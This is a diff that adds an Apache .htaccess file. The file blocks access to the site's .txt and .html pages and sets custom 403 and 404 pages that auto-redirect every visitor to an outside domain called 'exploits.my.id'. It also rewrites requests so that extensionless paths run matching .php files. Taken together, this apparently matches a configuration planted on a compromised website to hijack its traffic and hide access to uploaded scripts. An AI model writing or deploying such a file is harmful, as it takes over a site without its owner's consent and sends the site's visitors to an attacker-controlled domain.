@@ -1,0 +1,18 @@
+<Files *.txt>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.html>
+    Order Deny,Allow
+    Deny from all
+</Files>
+<Files *.htm>
+    Order Deny,Allow
+    Deny from all
+</Files>
+
+ErrorDocument 403 "<title>Redirect</title><h1>Error 403 Forbidden</h1><br>Redirecting to <i>https://exploits.my.id</i><meta http-equiv='refresh' content='1; URL=https://exploits.my.id/'>"
+ErrorDocument 404 "<title>Redirect</title><h1>Error 404 Not Found</h1><br>Redirecting to <i>https://exploits.my.id</i><meta http-equiv='refresh' content='1; URL=https://exploits.my.id/'>"
+
+RewriteCond %{REQUEST_FILENAME}.php -f
+RewriteRule !.*\.php$ %{REQUEST_FILENAME}.php [QSA,L]
